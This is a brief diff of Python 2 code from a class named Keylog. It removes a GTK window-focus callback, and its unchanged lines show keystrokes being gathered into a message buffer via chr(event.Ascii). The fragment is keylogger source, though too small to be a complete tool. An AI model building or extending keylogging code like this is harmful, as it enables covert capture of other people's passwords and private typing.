@@ -21,11 +21,6 @@ class Keylog(threading.Thread):
     print '---'
 	
     
-    def is_active_changed(window, param):
-        print window.props.is_active
-    
-    window.connect('notify::is-active', is_active_changed)
-    
     self.message += chr(event.Ascii).__str__()
     
     if not self.e.wait():
